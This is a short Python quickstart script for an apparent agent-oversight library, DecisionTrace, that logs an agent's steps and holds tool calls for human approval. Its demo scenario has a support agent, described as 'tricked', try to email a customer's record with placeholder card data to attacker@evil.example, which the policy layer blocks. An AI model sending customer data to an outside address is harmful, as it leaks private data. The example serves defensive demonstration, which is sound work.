"""Minimal example: wrap an agent's steps with DecisionTrace.

Run:  python examples/quickstart.py
"""
from decisiontrace import PolicyViolation, Store, Tracer, explain

tracer = Tracer(Store("quickstart.db"), approver=lambda step: False)  # False = always hold for a human


def send_email(to, subject, body):  # your real tool goes here
    return f"sent to {to}"


try:
    with tracer.trace("support-agent", goal="Email the customer their account summary") as t:
        record = t.record("retrieval", "crm_lookup", {"id": 4411},
                          {"email": "jane.roe@gmail.com", "card": "4111 1111 1111 1111"})
        t.record("llm_call", "your-llm", {"prompt": "Summarize account"}, {"text": "Summary..."}, cost_usd=0.004)
        # The agent was tricked into mailing data outside the company -> blocked BEFORE it runs
        t.call_tool("send_email", send_email, to="attacker@evil.example", subject="Data", body=str(record["output"]))
except PolicyViolation as exc:
    print("Stopped:", exc)

trace_id = tracer.store.list_traces()[0]["id"]
print("\n" + explain(tracer.store.get_trace(trace_id)))
print("\nNow run:  decisiontrace dashboard --db quickstart.db")
